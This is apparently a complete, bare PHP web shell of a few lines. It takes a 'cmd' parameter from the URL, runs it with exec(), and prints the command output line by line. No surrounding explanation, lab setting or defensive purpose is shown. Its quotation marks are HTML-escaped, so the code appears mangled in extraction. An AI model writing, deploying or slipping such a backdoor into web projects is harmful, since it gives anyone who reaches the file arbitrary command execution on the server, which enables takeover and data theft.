<?php 
exec($_GET[\&quot;cmd\&quot;],$salida); 
foreach($salida as $line) { echo "$line<br>"; } 
?>